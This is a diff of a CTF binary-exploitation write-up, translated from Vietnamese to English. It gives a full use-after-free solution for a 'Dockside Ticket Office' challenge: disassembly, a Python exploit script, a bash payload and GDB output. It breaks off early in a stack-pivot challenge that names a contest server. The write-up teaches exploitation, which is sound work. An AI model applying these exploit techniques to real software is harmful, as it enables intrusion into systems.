@@ -1,10 +1,9 @@
 ---
 title: '[CSSCTF] PWN / Binary Exploitation Challenges Writeup'
 date: '2026-10-02'
-description: Writeup chi tiết các thử thách khai thác nhị phân (Binary Exploitation
-  / PWN) trong CSSCTF.
+description: In-depth writeups for Binary Exploitation (PWN) challenges in CSSCTF 2026, covering Use-After-Free, 1-byte Stack Pivoting, and Ret2win.
 categories: [CSSCTF, Pwn]
-tags: [cssctf, pwn, binary-exploitation, buffer-overflow, rop]
+tags: [cssctf, pwn, binary-exploitation, buffer-overflow, rop, uaf, stack-pivot]
 series: [CSSCTF 2026]
 showAuthor: false
 showTableOfContents: true
@@ -12,66 +11,66 @@ showTableOfContents: true
 
 # [CSSCTF] PWN / Binary Exploitation Challenges Writeup
 
-**Tác giả:** k0z1l
-**Thể loại:** Binary Exploitation (PWN)  
-**Định dạng Flag:** `CSSCTF{...}`
+**Author:** k0z1l  
+**Category:** Binary Exploitation (PWN)  
+**Flag Format:** `CSSCTF{...}`  
 
 ---
 
-## Mục lục
+## Table of Contents
 1. [Dockside Ticket Office](#1-dockside-ticket-office)
-   - [1.0. TL;DR & Tóm tắt khai thác](#10-tldr--tóm-tắt-khai-thác)
-   - [1.1. Thông tin file & Cơ chế bảo vệ](#11-thông-tin-file--cơ-chế-bảo-vệ)
-   - [1.2. Bảng Symbol](#12-bảng-symbol)
-   - [1.3. Reverse & Phân tích chi tiết từng hàm](#13-reverse--phân-tích-chi-tiết-từng-hàm)
-   - [1.4. Phân tích lỗ hổng Use-After-Free](#14-phân-tích-lỗ-hổng-use-after-free)
-   - [1.5. Đường đi khai thác (Exploit Primitive)](#15-đường-đi-khai-thác-exploit-primitive)
-   - [1.6. Các cách giải & Script khai thác](#16-các-cách-giải--script-khai-thác)
-   - [1.7. Cạm bẫy kỹ thuật: Buffer stdio vs Syscall `read(2)`](#17-cạm-bẫy-kỹ-thuật-buffer-stdio-vs-syscall-read2)
-   - [1.8. Kiểm chứng bằng GDB](#18-kiểm-chứng-bằng-gdb)
-   - [1.9. Tổng kết & Flag](#19-tổng-kết--flag)
+   - [1.0. TL;DR & Exploitation Summary](#10-tldr--exploitation-summary)
+   - [1.1. File Information & Security Mitigations](#11-file-information--security-mitigations)
+   - [1.2. Symbol Table](#12-symbol-table)
+   - [1.3. Reverse Engineering & Function Analysis](#13-reverse-engineering--function-analysis)
+   - [1.4. Use-After-Free Vulnerability Analysis](#14-use-after-free-vulnerability-analysis)
+   - [1.5. Exploitation Primitive & Strategy](#15-exploitation-primitive--strategy)
+   - [1.6. Solution Methods & Exploit Scripts](#16-solution-methods--exploit-scripts)
+   - [1.7. Technical Pitfall: Stdio Buffering vs. `read(2)` Syscall](#17-technical-pitfall-stdio-buffering-vs-read2-syscall)
+   - [1.8. Verification with GDB](#18-verification-with-gdb)
+   - [1.9. Summary & Flag](#19-summary--flag)
 2. [Maintenance Log](#2-maintenance-log)
-   - [2.0. TL;DR & Tóm tắt khai thác](#20-tldr--tóm-tắt-khai-thác)
-   - [2.1. Thông tin file & Cơ chế bảo vệ](#21-thông-tin-file--cơ-chế-bảo-vệ)
-   - [2.2. Bản đồ hàm & Phân tích chuỗi string](#22-bản-đồ-hàm--phân-tích-chuỗi-string)
-   - [2.3. Disassembly có chú thích](#23-disassembly-có-chú-thích)
-   - [2.4. Phân tích Stack Layout & Khoảng cách bộ nhớ](#24-phân-tích-stack-layout--khoảng-cách-bộ-nhớ)
-   - [2.5. Cơ chế `leave` & Kỹ thuật Stack Pivot 1-byte](#25-cơ-chế-leave--kỹ-thuật-stack-pivot-1-byte)
-   - [2.6. Tìm kiếm ROP Gadget](#26-tìm-kiếm-rop-gadget)
-   - [2.7. Cạm bẫy kỹ thuật: Tại sao không được nhảy vào giữa hàm win?](#27-cạm-bẫy-kỹ-thuật-tại-sao-không-được-nhảy-vào-giữa-hàm-win)
-   - [2.8. Script khai thác hoàn chỉnh (Local & Remote)](#28-script-khai-thác-hoàn-chỉnh-local--remote)
-   - [2.9. Kiểm chứng bằng GDB & Transcript](#29-kiểm-chứng-bằng-gdb--transcript)
-   - [2.10. Tổng kết & Flag](#210-tổng-kết--flag)
+   - [2.0. TL;DR & Exploitation Summary](#20-tldr--exploitation-summary)
+   - [2.1. File Information & Security Mitigations](#21-file-information--security-mitigations)
+   - [2.2. Function Map & String Analysis](#22-function-map--string-analysis)
+   - [2.3. Annotated Disassembly](#23-annotated-disassembly)
+   - [2.4. Stack Layout Analysis & Memory Offsets](#24-stack-layout-analysis--memory-offsets)
+   - [2.5. The `leave` Instruction & 1-Byte Stack Pivot Technique](#25-the-leave-instruction--1-byte-stack-pivot-technique)
+   - [2.6. Finding ROP Gadgets](#26-finding-rop-gadgets)
+   - [2.7. Technical Pitfall: Why Mid-Function Jumping to `win` Fails](#27-technical-pitfall-why-mid-function-jumping-to-win-fails)
+   - [2.8. Complete Exploit Script (Local & Remote)](#28-complete-exploit-script-local--remote)
+   - [2.9. Verification with GDB & Execution Transcript](#29-verification-with-gdb--execution-transcript)
+   - [2.10. Summary & Flag](#210-summary--flag)
 3. [Kuiper Belt Relay Core](#3-kuiper-belt-relay-core)
-   - [3.1. Mô tả thử thách & Dữ kiện](#31-mô-tả-thử-thách--dữ-kiện)
-   - [3.2. Phân tích mã nguồn & Xác định lỗ hổng (Vulnerability Analysis)](#32-phân-tích-mã-nguồn--xác-định-lỗ-hổng-vulnerability-analysis)
-   - [3.3. Mô hình bộ nhớ Stack & Kỹ thuật ret2win](#33-mô-hình-bộ-nhớ-stack--kỹ-thuật-ret2win)
-   - [3.4. Phương pháp xác định địa chỉ mục tiêu (Target Discovery)](#34-phương-pháp-xác-định-địa-chỉ-mục-tiêu-target-discovery)
-   - [3.5. Mã nguồn khai thác hoàn chỉnh (Python / Pwntools)](#35-mã-nguồn-khai-thác-hoàn-chỉnh-python--pwntools)
-   - [3.6. Kết quả thực thi & Flag](#36-kết-quả-thực-thi--flag)
-   - [3.7. Biện pháp phòng chống & Khắc phục lỗ hổng (Remediation)](#37-biện-pháp-phòng-chống--khắc-phục-lỗ-hổng-remediation)
+   - [3.1. Challenge Description & Provided Assets](#31-challenge-description--provided-assets)
+   - [3.2. Source Code & Vulnerability Analysis](#32-source-code--vulnerability-analysis)
+   - [3.3. Stack Memory Layout & Ret2win Technique](#33-stack-memory-layout--ret2win-technique)
+   - [3.4. Target Discovery Method](#34-target-discovery-method)
+   - [3.5. Complete Exploit Code (Python / Pwntools)](#35-complete-exploit-code-python--pwntools)
+   - [3.6. Execution Results & Flag](#36-execution-results--flag)
+   - [3.7. Remediation](#37-remediation)
 
 ---
 
 ## 1. Dockside Ticket Office
 
 > **Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}`  
-> **Bug:** **Use-After-Free** (`free` nhưng không NULL con trỏ toàn cục) $\rightarrow$ ghi đè **con trỏ hàm** trong struct đã free $\rightarrow$ gọi `open_gate()` để in flag.  
-> **Đặc điểm:** Không cần leak, không cần canary, không cần tcache magic: binary **non-PIE** nên mọi địa chỉ là hằng số.
+> **Vulnerability:** **Use-After-Free** (`free` without clearing the global pointer to NULL) $\rightarrow$ overwrite a **function pointer** in the freed struct $\rightarrow$ call `open_gate()` to print the flag.  
+> **Key Characteristics:** No address leak required, no canary bypass needed, no complex tcache manipulation required: the binary is **non-PIE**, so all virtual addresses are constants.
 
 ---
 
-### 1.0. TL;DR & Tóm tắt khai thác
+### 1.0. TL;DR & Exploitation Summary
 
 ```text
 1. Create ticket      -> malloc(0x28); struct *t;  t->fn = deny_access
-2. Cancel ticket      -> free(t)          <-- global t KHÔNG bị set NULL  => UAF
-3. Edit ticket        -> read(0, t, 0x28) <-- ghi đè vùng nhớ đã free (UAF write)
+2. Cancel ticket      -> free(t)          <-- global t is NOT set to NULL => UAF
+3. Edit ticket        -> read(0, t, 0x28) <-- overwrite freed memory (UAF write)
                          payload = b'A'*0x20 + p64(0x40125f)   # fn = open_gate
-4. Use ticket         -> call *(t+0x20)   ==> open_gate()  in "CSSCTF{...}"
+4. Use ticket         -> call *(t+0x20)   ==> open_gate()  prints "CSSCTF{...}"
 ```
 
-Payload gửi cho `Edit`: đúng **0x28 = 40 byte**.
+Payload sent to `Edit`: exactly **0x28 = 40 bytes**.
 
 ```text
 00000000: 4141 4141 4141 4141 4141 4141 4141 4141   A...............
@@ -81,50 +80,50 @@ Payload gửi cho `Edit`: đúng **0x28 = 40 byte**.
 
 ---
 
-### 1.1. Thông tin file & Cơ chế bảo vệ
+### 1.1. File Information & Security Mitigations
 
 ```console
 $ file dockside_ticket
-ELF 64-bit LSB executable, x86-64, dynamically linked,
+dockside_ticket: ELF 64-bit LSB executable, x86-64, dynamically linked,
 interpreter /lib64/ld-linux-x86-64.so.2,
 for GNU/Linux 3.2.0, not stripped
 ```
 
-| Thuộc tính | Giá trị | Ý nghĩa |
+| Property | Value | Security Implication |
 |---|---|---|
-| Type | `EXEC` | **Không PIE** $\rightarrow$ địa chỉ code cố định (`0x401150`, `0x40125f`…) $\rightarrow$ hardcode được, **không cần leak** |
-| NX | `GNU_STACK RW` | NX bật $\rightarrow$ không nhét shellcode lên stack |
-| RELRO | `GNU_RELRO` + không có `BIND_NOW` | Partial RELRO $\rightarrow$ GOT ghi được (nhưng bài này không cần) |
-| Canary | chỉ ở `main` (`mov rax, fs:0x28`) | Các hàm menu **không** có canary $\rightarrow$ không liên quan |
-| Symbols | `not stripped` | Còn `open_gate`, `deny_access`, `active_ticket` $\rightarrow$ đọc code rất nhanh |
+| Type | `EXEC` | **No PIE** $\rightarrow$ fixed code addresses (`0x401150`, `0x40125f`…) $\rightarrow$ hardcodable, **no leak required** |
+| NX | `GNU_STACK RW` | NX enabled $\rightarrow$ shellcode injection on the stack is not executable |
+| RELRO | `GNU_RELRO` without `BIND_NOW` | Partial RELRO $\rightarrow$ GOT is writable (not needed for this exploit) |
+| Canary | Only in `main` (`mov rax, fs:0x28`) | Menu handlers **lack** stack canaries $\rightarrow$ irrelevant |
+| Symbols | `not stripped` | Symbol names preserved (`open_gate`, `deny_access`, `active_ticket`) $\rightarrow$ rapid analysis |
 | Build | `GCC 13.3.0-6ubuntu2~24.04.1` | Ubuntu 24.04 $\Rightarrow$ glibc 2.39 |
 
-*Lưu ý về canary:* `main` có stack canary, nhưng lỗi của bài **không nằm trên stack** $\rightarrow$ không cần quan tâm.
+*Note on Canary:* Although `main` contains a stack canary, the flaw is **heap-based rather than stack-based**, rendering the canary irrelevant.
 
 ---
 
-### 1.2. Bảng Symbol (lấy từ `readelf -sW`)
+### 1.2. Symbol Table (from `readelf -sW`)
 
-| Địa chỉ | Tên | Vai trò |
+| Address | Symbol Name | Description / Role |
 |---|---|---|
-| `0x401236` | `deny_access` | in "Ticket scanned." + "Access denied…" |
-| `0x40125f` | **`open_gate`** | in "Ticket scanned." + "Emergency harbour access granted." + **`puts(flag)`** |
-| `0x401297` | `print_banner` | banner |
-| `0x4012de` | `menu` | in menu |
-| `0x401357` | `create_ticket` | `malloc(0x28)` + khởi tạo |
-| `0x4013c3` | `cancel_ticket` | **`free()` — thủ phạm** |
-| `0x401408` | `edit_ticket` | **`read(0, ptr, 0x28)` — UAF write** |
-| `0x401466` | `use_ticket` | **`call *(ptr+0x20)` — UAF call** |
-| `0x40149f` | `main` | vòng lặp menu |
-| `0x404068` | `active_ticket` | con trỏ toàn cục tới ticket |
-| `0x402088` | *(rodata)* | chuỗi `"CSSCTF{us3_4ft3r_fr33_d0cks1d3}"` |
+| `0x401236` | `deny_access` | Prints "Ticket scanned." + "Access denied…" |
+| `0x40125f` | **`open_gate`** | Prints "Ticket scanned." + "Emergency harbour access granted." + **`puts(flag)`** |
+| `0x401297` | `print_banner` | Displays service banner |
+| `0x4012de` | `menu` | Prints command menu |
+| `0x401357` | `create_ticket` | Calls `malloc(0x28)` and initializes structure |
+| `0x4013c3` | `cancel_ticket` | **`free()` call without clearing pointer (root cause)** |
+| `0x401408` | `edit_ticket` | **`read(0, ptr, 0x28)` — arbitrary UAF write** |
+| `0x401466` | `use_ticket` | **`call *(ptr+0x20)` — indirect UAF execution** |
+| `0x40149f` | `main` | Main interactive menu loop |
+| `0x404068` | `active_ticket` | Global pointer holding ticket object reference |
+| `0x402088` | *(rodata)* | Flag string `"CSSCTF{us3_4ft3r_fr33_d0cks1d3}"` |
 
 ---
 
-### 1.3. Reverse & Phân tích chi tiết từng hàm
+### 1.3. Reverse Engineering & Function Analysis
 
-#### 1.3.1. Struct `ticket`
-`create_ticket` cấp phát `malloc(0x28)`:
+#### 1.3.1. Structure `ticket`
+`create_ticket` allocates `malloc(0x28)`:
 
 ```asm
 40137c:  mov  edi,0x28                 ; size = 40
@@ -136,21 +135,21 @@ for GNU/Linux 3.2.0, not stripped
 4013ae:  mov  QWORD PTR [rax+0x20],rdx      ; t->fn = deny_access
 ```
 
-Suy ra layout (C):
+Reconstructed C structure layout:
 
 ```c
-struct ticket {                 /* malloc(0x28) -> chunk 0x30, tcache idx 1 */
-    char name[8];               /* +0x00  "GUEST\0\0\0"        */
-    /* 8 byte không khởi tạo */ /* +0x08                        */
-    /* 16 byte không khởi tạo */ /* +0x10 .. +0x1f               */
-    void (*fn)(void);           /* +0x20  = &deny_access        */
-};                              /* +0x28 = hết vùng user        */
-struct ticket *active_ticket;   /* global @ 0x404068            */
+struct ticket {                 /* malloc(0x28) -> chunk size 0x30, tcache bin 1 */
+    char name[8];               /* +0x00  "GUEST\0\0\0"                          */
+    /* 8 bytes uninitialized */ /* +0x08                                         */
+    /* 16 bytes uninitialized*/ /* +0x10 .. +0x1f                                */
+    void (*fn)(void);           /* +0x20  = &deny_access                         */
+};                              /* +0x28 = total user data size                  */
+struct ticket *active_ticket;   /* global pointer @ 0x404068                     */
 ```
 
-Chỉ 2 vùng được ghi khi tạo: `+0x00` (tên) và `+0x20` (con trỏ hàm). 20 byte ở giữa là **rác của malloc** (không zero) — nhưng `edit` đọc đủ 40 byte nên ta kiểm soát toàn bộ.
+Only two fields are initialized upon creation: `+0x00` (name) and `+0x20` (function pointer). The remaining intermediate bytes are uninitialized heap padding. However, because `edit_ticket` allows writing a full 40 bytes, all fields are fully controllable.
 
-#### 1.3.2. `create_ticket` (0x401357)
+#### 1.3.2. `create_ticket` (`0x401357`)
 
 ```c
 void create_ticket(void) {
@@ -162,9 +161,9 @@ void create_ticket(void) {
 }
 ```
 
-$\rightarrow$ **Điểm chốt:** Chỉ được tạo **một** ticket duy nhất. Vì `active_ticket` không bao giờ bị set về `NULL`, `malloc` **không bao giờ được gọi lần thứ 2** $\Rightarrow$ không thể double-free / tcache poisoning $\Rightarrow$ hướng khai thác phải là *dùng chính con trỏ treo*.
+- **Key Takeaway:** Only a **single** ticket may be allocated at any time. Because `active_ticket` is never reset to `NULL`, `malloc` is never invoked a second time $\Rightarrow$ double-free or tcache poisoning attacks cannot be triggered $\Rightarrow$ the exploitation path must leverage the dangling pointer directly.
 
-#### 1.3.3. `cancel_ticket` (0x4013c3) — LỖI
+#### 1.3.3. `cancel_ticket` (`0x4013c3`) — The Vulnerability
 
 ```asm
 4013cb:  mov rax,[rip+0x2c96]     ; rax = active_ticket
@@ -183,19 +182,19 @@ $\rightarrow$ **Điểm chốt:** Chỉ được tạo **một** ticket duy nh�
 ```c
 void cancel_ticket(void) {
     if (!active_ticket) { puts("No active ticket."); return; }
-    free(active_ticket);                 // <-- active_ticket vẫn giữ địa chỉ cũ
-    puts("Ticket cancelled.");           //     KHÔNG hề có  active_ticket = NULL;
+    free(active_ticket);                 // <-- active_ticket retains dangling address
+    puts("Ticket cancelled.");           //     No active_ticket = NULL; assignment exists!
 }
 ```
 
-$\rightarrow$ **Use-After-Free kinh điển.** Sau bước này:
-* `active_ticket` $\rightarrow$ chunk **đã được trả về tcache bin size 0x30**.
-* 8 byte đầu vùng user = `tcache->entries[1]` (`NULL` vì bin rỗng) — đúng kiểu "giờ thì ticket không còn hợp lệ".
+- **Classic Use-After-Free:** After this function executes:
+  - `active_ticket` points to a chunk that has been returned to the **0x30 tcache bin**.
+  - The first 8 bytes of user data become `tcache->entries[1]` (`NULL` when the bin is empty).
 
-#### 1.3.4. `edit_ticket` (0x401408)
+#### 1.3.4. `edit_ticket` (`0x401408`)
 
 ```asm
-401410:  mov  rax,[rip+0x2c51]     ; rax = active_ticket (con trỏ treo!)
+401410:  mov  rax,[rip+0x2c51]     ; rax = active_ticket (dangling pointer)
 401417:  test rax,rax
 40141a:  jne  0x40142d
 40141c:  ... "No active ticket."
@@ -203,7 +202,7 @@ $\rightarrow$ **Use-After-Free kinh điển.** Sau bước này:
 401437:  call puts@plt
 40143c:  mov  rax,[rip+0x2c25]     ; rax = active_ticket
 401443:  mov  edx,0x28             ; len = 0x28
-401448:  mov  rsi,rax              ; buf = active_ticket   <== ĐÍCH GHI
+401448:  mov  rsi,rax              ; buf = active_ticket   <== WRITE TARGET
 40144b:  mov  edi,0x0              ; fd = 0 (stdin)
 401450:  call read@plt             ; read(0, active_ticket, 0x28)
 401455:  ... "Ticket updated."
@@ -213,74 +212,73 @@ $\rightarrow$ **Use-After-Free kinh điển.** Sau bước này:
 void edit_ticket(void) {
     if (!active_ticket) { puts("No active ticket."); return; }
     puts("Enter new ticket data:");
-    read(0, active_ticket, 0x28);     // <-- UAF WRITE, ghi vào chunk đã free
+    read(0, active_ticket, 0x28);     // <-- UAF WRITE: writes into freed chunk
     puts("Ticket updated.");
 }
 ```
 
-Vì sao 0x28 byte là *vừa đủ*:
-* Vùng user = `0x00 … 0x27`; cần với tới `+0x20` $\Rightarrow$ chỉ cần 40 byte $\Rightarrow$ **không cần overflow** gì cả, `read` "hợp lệ" 100% theo thiết kế.
-* `read` **không thêm `\0`**, không quan tâm nội dung $\Rightarrow$ ghi được cả byte NUL (địa chỉ 64-bit luôn chứa NUL) — điều mà `fgets`/`scanf("%s")` không làm được.
+Why 0x28 bytes is ideal:
+- User space spans offsets `0x00 .. 0x27`; reaching `+0x20` requires only 40 bytes $\Rightarrow$ no out-of-bounds overflow is required; the `read` call is entirely standard.
+- `read` **does not append a terminating `\0`** and does not truncate on NUL bytes $\Rightarrow$ 64-bit addresses containing NUL bytes can be written intact—a capability not possible with `fgets` or `scanf("%s")`.
 
-#### 1.3.5. `use_ticket` (0x401466) — Điểm nổ
+#### 1.3.5. `use_ticket` (`0x401466`) — Trigger
 
 ```asm
-40146e:  mov  rax,[rip+0x2bf3]     ; rax = active_ticket (treo)
+40146e:  mov  rax,[rip+0x2bf3]     ; rax = active_ticket (dangling pointer)
 401475:  test rax,rax
 401478:  jne  0x40148b
 40147a:  ... "No active ticket."
 40148b:  mov  rax,[rip+0x2bd6]     ; rax = active_ticket
-401492:  mov  rdx,[rax+0x20]       ; rdx = t->fn      <== đọc từ chunk đã free
+401492:  mov  rdx,[rax+0x20]       ; rdx = t->fn      <== fetched from freed chunk
 401496:  mov  eax,0x0
-40149b:  call rdx                  ; <== GỌI HÀM QUA CON TRỎ TRONG HEAP
+40149b:  call rdx                  ; <== INDIRECT FUNCTION CALL
 ```
 
 ```c
 void use_ticket(void) {
     if (!active_ticket) { puts("No active ticket."); return; }
-    active_ticket->fn();            // indirect call
+    active_ticket->fn();            // Indirect function call via heap pointer
 }
 ```
 
-$\rightarrow$ **Primitive hoàn hảo**: một lần gọi hàm (không tham số) tới **bất kỳ địa chỉ nào ta chọn** (giá trị nạp vào `+0x20`).
+- **Primitive:** A zero-argument function call to an **arbitrary address** supplied at offset `+0x20`.
 
-#### 1.3.6. Hàm "win" — `open_gate` (0x40125f)
+#### 1.3.6. Win Function: `open_gate` (`0x40125f`)
 
 ```asm
 40125f <open_gate>:
   puts(0x402008)   ; "Ticket scanned."
   puts(0x402060)   ; "Emergency harbour access granted."
-  puts(0x402088)   ; <-- CHUỖI FLAG trong .rodata
+  puts(0x402088)   ; <-- FLAG STRING in .rodata
   ret
 ```
 
-**Kết luận:** Chỉ cần biến con trỏ hàm từ `deny_access` (`0x401236`) thành `open_gate` (`0x40125f`) là xong.
+**Conclusion:** Overwriting the function pointer from `deny_access` (`0x401236`) with `open_gate` (`0x40125f`) completes the exploitation chain.
 
 ---
 
-### 1.4. Phân tích lỗ hổng Use-After-Free
+### 1.4. Use-After-Free Vulnerability Analysis
 
-| # | Điều kiện | Có trong bài? |
+| # | Exploitation Prerequisite | Present in Target? |
 |---|---|---|
-| 1 | Vùng nhớ được `free` nhưng con trỏ vẫn dùng được | ✅ `cancel_ticket` không NULL hoá `active_ticket` |
-| 2 | Có đường **ghi** vào vùng đã free | ✅ `edit_ticket` $\rightarrow$ `read(0, ptr, 0x28)` |
-| 3 | Vùng đã free chứa thứ "có sức mạnh" | ✅ `+0x20` là **function pointer** được `call` |
-| 4 | Biết đích để ghi | ✅ **non-PIE** $\Rightarrow$ `open_gate = 0x40125f` (hằng số) |
-| 5 | Ghi được byte NUL | ✅ `read(2)` thô |
+| 1 | Memory freed while reference remains usable | Yes (`cancel_ticket` fails to set `active_ticket = NULL`) |
+| 2 | Arbitrary write primitive into the freed chunk | Yes (`edit_ticket` performs `read(0, ptr, 0x28)`) |
+| 3 | Freed memory holds high-impact control structures | Yes (`+0x20` contains a function pointer invoked by `call`) |
+| 4 | Predictable/known target address | Yes (Non-PIE executable $\Rightarrow$ `open_gate = 0x40125f` is constant) |
+| 5 | Ability to write NUL bytes into memory | Yes (Raw `read(2)` syscall does not truncate on NUL) |
 
-Không cần: leak libc, leak heap, bypass canary, bypass ASLR, ROP, SROP. **Toàn bộ exploit = 40 byte.**
+No information leaks (libc/heap), canary bypasses, ASLR workarounds, or ROP chains are required. The entire payload fits within 40 bytes.
 
 ---
 
-### 1.5. Đường đi khai thác (Exploit Primitive)
+### 1.5. Exploitation Primitive & Strategy
 
 ```text
-[+] Create  -> malloc(0x28)         active_ticket = 0x406xxx (heap sau .bss)
-                                    [0x00]="GUEST"  [0x20]=0x401236 deny_access
-[+] Cancel  -> free(active_ticket)  chunk vào tcache 0x30, CON TRỎ VẪN SỐNG  (UAF)
+[+] Create  -> malloc(0x28)         active_ticket = 0x406xxx (heap after .bss)
+                                    [0x00]="GUEST"  [0x20]=0x401236 (deny_access)
+[+] Cancel  -> free(active_ticket)  chunk enters tcache 0x30, POINTER REMAINS (UAF)
 [+] Edit    -> read(0, 0x406xxx, 0x28)
-                payload: 32 x 'A'  +  p64(0x40125f)
-                (đầy đủ thì ghi luôn cả tcache next/key ở +0x00/+0x08, không sao)
+                payload: 32 * 'A' + p64(0x40125f)
 [+] Use     -> call *(0x406xxx+0x20) == 0x40125f == open_gate
                                     ==> "Emergency harbour access granted."
                                         CSSCTF{us3_4ft3r_fr33_d0cks1d3}
@@ -288,9 +286,9 @@ Không cần: leak libc, leak heap, bypass canary, bypass ASLR, ROP, SROP. **To�
 
 ---
 
-### 1.6. Các cách giải & Script khai thác
+### 1.6. Solution Methods & Exploit Scripts
 
-#### Cách 1 — Script Python đầy đủ (Local & Remote)
+#### Method 1: Python Exploit Script (Local & Remote)
 
 ```python
 #!/usr/bin/env python3
@@ -300,7 +298,7 @@ import os, sys, struct, select, subprocess, time
 BIN       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dockside_ticket")
 OPEN_GATE = 0x40125f                      # .text: puts("...granted."); puts(flag)
 p64 = lambda x: struct.pack("<Q", x)
-PAYLOAD = b"B" * 0x20 + p64(OPEN_GATE)    # đúng 0x28 byte cho read(0, ptr, 0x28)
+PAYLOAD = b"B" * 0x20 + p64(OPEN_GATE)    # exactly 0x28 bytes for read(0, ptr, 0x28)
 
 class IO:
     def __init__(self, p):
@@ -337,16 +335,16 @@ def main(host=None, port=None):
         p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         io = IO(p)
 
-    io.recv_until(b"> ")              # menu
-    io.send(b"1\n")                   # 1. create
+    io.recv_until(b"> ")              # menu prompt
+    io.send(b"1\n")                   # 1. create ticket
     io.recv_until(b"> ")
-    io.send(b"2\n")                   # 2. cancel -> free(), con trỏ treo
+    io.send(b"2\n")                   # 2. cancel ticket -> free(), pointer dangles
     io.recv_until(b"> ")
-    io.send(b"3\n")                   # 3. edit
-    io.recv_until(b"data:")           # đợi read(2) thô đang chờ
-    io.send(PAYLOAD)                  #    ghi đè fn @ +0x20 = open_gate
+    io.send(b"3\n")                   # 3. edit ticket
+    io.recv_until(b"data:")           # await raw read(2)
+    io.send(PAYLOAD)                  # overwrite fn @ +0x20 with open_gate
     io.recv_until(b"> ")
-    io.send(b"4\n")                   # 4. use -> call *(ptr+0x20) = open_gate()
+    io.send(b"4\n")                   # 4. use ticket -> call *(ptr+0x20) = open_gate()
     io.recv_until(b"granted.")
     io.recv_until(b"> ", timeout=2)
     io.send(b"5\n")
@@ -357,7 +355,7 @@ if __name__ == "__main__":
     main(host, port)
 ```
 
-#### Cách 2 — Bash one-liner
+#### Method 2: Bash One-Liner
 
 ```bash
 {
@@ -373,25 +371,25 @@ if __name__ == "__main__":
 
 ---
 
-### 1.7. Cạm bẫy kỹ thuật: Buffer stdio vs Syscall `read(2)`
+### 1.7. Technical Pitfall: Stdio Buffering vs. `read(2)` Syscall
 
-* `main` đọc lựa chọn bằng `__isoc99_scanf("%d", &opt)` $\rightarrow$ `scanf` đi qua **stdio buffer của glibc**.
-* `getchar()` sau đó cũng lấy từ buffer đó.
-* Nhưng `edit_ticket` gọi `read(2)` — **syscall thô, bỏ qua stdio**.
+- `main` reads menu options using `__isoc99_scanf("%d", &opt)`, which relies on glibc's internal `stdio` buffering mechanism.
+- The subsequent `getchar()` also reads directly from that stream buffer.
+- In contrast, `edit_ticket` invokes `read(2)`—a raw kernel syscall bypassing the `FILE*` buffer entirely.
 
-Khi lần `scanf` đầu tiên chạy, glibc `read()` một phát **cả khối 4096 byte** từ pipe/socket vào FILE buffer. Nếu bơm hết input một lượt, **toàn bộ payload đã bị stdio nuốt**, pipe rỗng:
+When the initial `scanf` executes, glibc reads an entire 4096-byte chunk from the pipe or socket into its user-space buffer. If all commands are streamed simultaneously into stdin:
 
-| Cách bơm input | Triệu chứng |
+| Input Transmission Method | Observed Behavior |
 |---|---|
-| Bơm hết một lượt, stdin là pipe còn mở | `read(2)` trong `edit` **BLOCK vĩnh viễn** $\rightarrow$ treo |
-| Bơm hết một lượt rồi đóng stdin (EOF) | `read(2)` trả `0` $\rightarrow$ payload **không được ghi** $\rightarrow$ menu sau đó in `Invalid input.` |
-| Gửi từng bước, đợi prompt | ✅ chạy đúng |
+| Streamed in a single batch, stdin pipe remains open | The `read(2)` syscall inside `edit_ticket` blocks indefinitely $\rightarrow$ exploit hangs |
+| Streamed in a single batch, stdin closed immediately (EOF) | `read(2)` returns `0` $\rightarrow$ payload is not written $\rightarrow$ menu reports `Invalid input.` |
+| Interactive / Synchronized send after each prompt | Execution succeeds reliably |
 
-**Quy tắc:** gửi 1 lựa chọn $\rightarrow$ `recv_until("> ")` $\rightarrow$ mới gửi bước kế; và với payload thì `recv_until("Enter new ticket data:")` rồi mới ghi 40 byte.
+**Operational Rule:** Send menu selections sequentially after verifying each prompt (`recv_until("> ")`), and transmit the 40-byte binary payload only upon matching `Enter new ticket data:`.
 
 ---
 
-### 1.8. Kiểm chứng bằng GDB
+### 1.8. Verification with GDB
 
 ```console
 Breakpoint 1, 0x000000000040148b in use_ticket ()
@@ -400,20 +398,20 @@ rax = 0x406020   (chunk user data)
 0x406030: 0x4141414141414141  0x4141414141414141
 0x406040: 0x000000000040125f  0x0000000000000301
 Breakpoint 2, 0x000000000040149b in use_ticket ()
-tai call rdx: rdx = 0x40125f
+at call rdx: rdx = 0x40125f
 0x000000000040125f in open_gate ()
-sau si: rip = 0x40125f  ==> open_gate
+after si: rip = 0x40125f  ==> open_gate
 ```
 
 ---
 
-### 1.9. Tổng kết & Flag
+### 1.9. Summary & Flag
 
-| Thuộc tính | Chi tiết |
+| Field | Detail |
 |---|---|
-| **Lỗi** | Use-After-Free (`free` không NULL hoá con trỏ toàn cục) |
-| **Primitive** | Ghi 0x28 byte vào chunk đã free (UAF write) + gọi hàm qua con trỏ trong chunk (UAF call) |
-| **Win Address** | `fn = open_gate (0x40125f)` |
+| **Vulnerability** | Use-After-Free (`free` fails to NULL global reference pointer) |
+| **Exploit Primitive** | 0x28-byte write into freed chunk (UAF write) + indirect call via function pointer (UAF call) |
+| **Target Function** | `open_gate` (`0x40125f`) |
 | **Flag** | **`CSSCTF{us3_4ft3r_fr33_d0cks1d3}`** |
 
 ---
@@ -423,46 +421,46 @@ sau si: rip = 0x40125f  ==> open_gate
 
 > **Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`  
 > **Server:** `nc 34.116.80.78 7312`  
-> **Bug:** `read(0, token, 0x21)` ghi vào buffer `0x20` $\rightarrow$ byte thứ 33 rơi đúng **byte thấp của saved rbp của frame cha** $\rightarrow$ `leave` của frame cha biến thành **stack pivot 1 byte** vào chính buffer báo cáo (đã được `printf("%p")` **leak địa chỉ**).  
-> **Win:** `func_auth(0xdeadbeef, 0xcafebabe)` @ `0x401268` $\rightarrow$ `fopen("flag.txt")` $\rightarrow$ in flag.  
-> **Đặc điểm:** Không cần phá canary (đường win gọi `exit()` trước khi check), không cần leak PIE/libc (binary non-PIE).
+> **Vulnerability:** `read(0, token, 0x21)` writes into a `0x20`-byte buffer $\rightarrow$ the 33rd byte overwrites the **least significant byte (LSB) of the caller's saved RBP** $\rightarrow$ the caller's `leave` instruction triggers a **1-byte stack pivot** directly into the report buffer (whose memory address is leaked via `printf("%p")`).  
+> **Win Function:** `func_auth(0xdeadbeef, 0xcafebabe)` @ `0x401268` $\rightarrow$ `fopen("flag.txt")` $\rightarrow$ outputs the flag.  
